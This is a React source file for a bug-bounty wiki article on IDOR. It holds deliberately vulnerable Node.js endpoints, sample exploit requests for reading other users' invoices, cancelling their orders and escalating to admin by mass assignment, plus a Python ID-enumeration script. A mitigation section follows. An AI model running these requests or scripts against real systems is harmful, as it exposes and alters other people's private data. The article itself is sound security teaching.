/**
 * IDOR - INSECURE DIRECT OBJECT REFERENCE
 * Accessing other users' resources
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Key, User, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function IDORContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="What is IDOR?">
        <Paragraph>
          <Strong>Insecure Direct Object Reference (IDOR)</Strong> occurs when an application 
          exposes direct references to internal objects (IDs, file names, etc.) without 
          verifying that the user has permission to access them.
        </Paragraph>

        <AlertDanger title="Critical Impact">
          IDOR allows an attacker to:
          <ul className="mt-2 space-y-1">
            <ListItem>View private documents of other users</ListItem>
            <ListItem>Modify other users' orders/transactions</ListItem>
            <ListItem>Access invoices, receipts, medical history</ListItem>
            <ListItem>Delete other users' content</ListItem>
            <ListItem>Escalate privileges (access admin panels)</ListItem>
          </ul>
        </AlertDanger>

        <AlertInfo>
          IDOR is one of the most reported vulnerabilities in Bug Bounty 
          because it's easy to find but can have severe impact.
        </AlertInfo>
      </Section>

      <Section id="basic-example" title="1. Basic IDOR - Changing ID in URL">
        <Subsection title="Vulnerable Scenario">
          <CodeBlock
            language="javascript"
            title="Node.js - Endpoint without authorization"
            code={`app.get('/api/invoice/:id', async (req, res) => {
  const invoiceId = req.params.id;
  
  // ❌ VULNERABLE - Only checks if exists, not if belongs to user
  const invoice = await db.invoices.findById(invoiceId);
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  // Without verifying ownership, returns the invoice
  res.json(invoice);
});`}
          />
        </Subsection>

        <Subsection title="Exploitation">
          <Paragraph>
            An authenticated user can simply increment the ID to view other users' invoices:
          </Paragraph>

          <TerminalOutput title="HTTP requests">
            {`# User views their own invoice
GET /api/invoice/1523 HTTP/1.1
Cookie: session=abc123

Response:
{
  "id": 1523,
  "user_id": 42,
  "total": 99.99,
  "items": [...]
}

# Change ID to view another user's invoice
GET /api/invoice/1524 HTTP/1.1
Cookie: session=abc123

Response:
{
  "id": 1524,
  "user_id": 87,  ← Different user!
  "total": 1599.99,
  "credit_card": "4532-****-****-9876"
}`}
          </TerminalOutput>

          <AlertWarning>
            With IDOR, the attacker can iterate all IDs and extract ALL invoices 
            from ALL users.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="idor-uuid" title="2. IDOR with UUIDs (Not Enough)">
        <Paragraph>
          Many developers believe that using UUIDs instead of sequential IDs prevents IDOR. 
          <Strong>This is FALSE</Strong>. UUIDs only make enumeration harder, 
          but do NOT verify authorization.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Still vulnerable code with UUID"
          code={`app.get('/api/document/:uuid', async (req, res) => {
  const documentUUID = req.params.uuid;
  
  // ❌ STILL VULNERABLE - UUID doesn't verify ownership
  const document = await db.documents.findByUUID(documentUUID);
  
  if (!document) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  // Without verifying if current user is the owner
  res.json(document);
});`}
        />

        <Subsection title="How to Obtain Other Users' UUIDs">
          <CodeBlock
            language="text"
            title="UUID leakage vectors"
            code={`1. List endpoints:
   GET /api/shared-documents
   → Returns UUIDs of shared documents

2. Notifications/Emails:
   "John shared document a3f5b8c2-..."
   
3. JavaScript in frontend:
   console.log() with UUIDs
   
4. Burp/History:
   Other requests may contain foreign UUIDs
   
5. Error messages:
   "Document a3f5b8c2-1234-... already exists"`}
          />
        </Subsection>
      </Section>

      <Section id="idor-body" title="3. IDOR in Request Body (POST/PUT)">
        <Paragraph>
          IDOR doesn't only occur in URLs. It can also be in request bodies:
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Vulnerable code in POST"
          code={`app.post('/api/order/update', async (req, res) => {
  const { orderId, status } = req.body;
  
  // ❌ VULNERABLE - Trusts orderId from client
  await db.orders.updateOne(
    { id: orderId },
    { status: status }
  );
  
  res.json({ success: true });
});`}
        />

        <Subsection title="Exploit - Modify Another User's Order">
          <CodeBlock
            language="http"
            title="Malicious request"
            code={`POST /api/order/update HTTP/1.1
Content-Type: application/json
Cookie: session=victim_session

{
  "orderId": 9999,    ← Another user's order ID
  "status": "cancelled"
}`}
          />

          <AlertDanger>
            The attacker can cancel other users' orders, change shipping addresses, 
            or modify prices if the backend doesn't validate ownership.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="idor-mass-assignment" title="4. IDOR + Mass Assignment">
        <Paragraph>
          Combining IDOR with Mass Assignment allows privilege escalation:
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Doubly vulnerable code"
          code={`app.put('/api/user/:id/update', async (req, res) => {
  const userId = req.params.id;
  const updateData = req.body;
  
  // ❌ VULNERABLE #1: Doesn't verify that userId == currentUser.id
  // ❌ VULNERABLE #2: Mass assignment - accepts any field
  await db.users.updateOne({ id: userId }, updateData);
  
  res.json({ success: true });
});`}
        />

        <CodeBlock
          language="http"
          title="Exploit - Become admin"
          code={`PUT /api/user/123/update HTTP/1.1
Content-Type: application/json

{
  "role": "admin",           ← Change role to admin
  "is_verified": true,
  "balance": 999999.99
}

# If attacker can change their own userId to 123 (an admin),
# or if they can guess an admin's ID, they gain privileges`}
        />
      </Section>

      <Section id="automation" title="5. IDOR Automation">
        <CodeBlock
          language="python"
          title="Script - Enumerate all documents"
          code={`import requests

BASE_URL = "https://vulnerable-app.com/api/document"
SESSION_COOKIE = "session=your_session_here"

def enumerate_documents(start_id, end_id):
    found_documents = []
    
    for doc_id in range(start_id, end_id):
        url = f"{BASE_URL}/{doc_id}"
        
        response = requests.get(
            url,
            cookies={'session': SESSION_COOKIE}
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Check if belongs to another user
            if data.get('owner_id') != YOUR_USER_ID:
                print(f"[!] IDOR Found: Document {doc_id}")
                print(f"    Owner: {data.get('owner_id')}")
                print(f"    Title: {data.get('title')}")
                found_documents.append(data)
        
        elif response.status_code == 403:
            # Exists but access denied (correct implementation)
            print(f"[ ] Protected: {doc_id}")
        
        # Rate limiting
        time.sleep(0.5)
    
    return found_documents

# Enumerate IDs from 1 to 10000
results = enumerate_documents(1, 10000)
print(f"\\n[+] Total IDOR vulnerabilities: {len(results)}")`}
        />

        <AlertTip title="Burp Intruder">
          Use Burp Suite Intruder to automate IDOR testing:
          <ul className="mt-2 space-y-1">
            <ListItem>Capture request with vulnerable ID</ListItem>
            <ListItem>Mark ID as payload position</ListItem>
            <ListItem>Payload type: Numbers (sequential)</ListItem>
            <ListItem>Analyze responses with different status codes/lengths</ListItem>
          </ul>
        </AlertTip>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Fundamental Principle">
          <Strong>NEVER trust IDs coming from the client.</Strong> Always verify 
          that the authenticated user has permission to access the resource.
        </AlertDanger>

        <Subsection title="1. Verify Ownership">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Verify resource belongs to user"
            code={`app.get('/api/invoice/:id', async (req, res) => {
  const invoiceId = req.params.id;
  const currentUserId = req.user.id; // From JWT token/session
  
  // ✅ SECURE - Find invoice that belongs to current user
  const invoice = await db.invoices.findOne({
    id: invoiceId,
    user_id: currentUserId  // ← KEY: Verify ownership
  });
  
  if (!invoice) {
    // Don't reveal if it exists or not (avoid information leak)
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});`}
          />
        </Subsection>

        <Subsection title="2. Don't Expose Direct IDs">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Use indirect references"
            code={`// Instead of exposing database IDs, use mapping
const userSessionMap = new Map(); // userId → random token

app.get('/api/my-invoices', async (req, res) => {
  const currentUserId = req.user.id;
  
  const invoices = await db.invoices.findAll({
    user_id: currentUserId
  });
  
  // Generate temporary tokens for each invoice
  const invoicesWithTokens = invoices.map(invoice => {
    const token = crypto.randomBytes(16).toString('hex');
    userSessionMap.set(token, {
      invoiceId: invoice.id,
      userId: currentUserId,
      expiresAt: Date.now() + 3600000 // 1 hour
    });
    
    return {
      token: token,  // ← Use instead of ID
      total: invoice.total,
      date: invoice.date
    };
  });
  
  res.json(invoicesWithTokens);
});

app.get('/api/invoice/:token', async (req, res) => {
  const token = req.params.token;
  const mapping = userSessionMap.get(token);
  
  if (!mapping || mapping.expiresAt < Date.now()) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  // Verify requesting user is the owner
  if (mapping.userId !== req.user.id) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  const invoice = await db.invoices.findById(mapping.invoiceId);
  res.json(invoice);
});`}
          />
        </Subsection>

        <Subsection title="3. ACL (Access Control List)">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Robust permissions system"
            code={`// Authorization middleware
async function checkResourcePermission(resourceType, resourceId, permission) {
  return async (req, res, next) => {
    const userId = req.user.id;
    
    // Search permissions table
    const hasPermission = await db.permissions.findOne({
      resource_type: resourceType,
      resource_id: resourceId,
      user_id: userId,
      permission: permission
    });
    
    if (!hasPermission) {
      // Also verify if is owner
      const resource = await db[resourceType].findById(resourceId);
      
      if (resource.owner_id !== userId && !req.user.is_admin) {
        return res.status(403).json({ error: 'Forbidden' });
      }
    }
    
    next();
  };
}

// Usage
app.get('/api/document/:id',
  checkResourcePermission('documents', req.params.id, 'read'),
  async (req, res) => {
    const document = await db.documents.findById(req.params.id);
    res.json(document);
  }
);`}
          />
        </Subsection>

        <Subsection title="4. Rate Limiting to Prevent Enumeration">
          <CodeBlock
            language="javascript"
            title="✅ Rate limiting with express-rate-limit"
            code={`const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Max 100 requests per IP
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to sensitive endpoints
app.use('/api/', apiLimiter);

// Stricter limiter for specific resources
const resourceLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 10, // Only 10 requests per minute
  keyGenerator: (req) => req.user.id, // Per user, not per IP
});

app.get('/api/invoice/:id', resourceLimiter, async (req, res) => {
  // ...
});`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: Race Conditions</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/race-conditions`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Exploiting race conditions</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
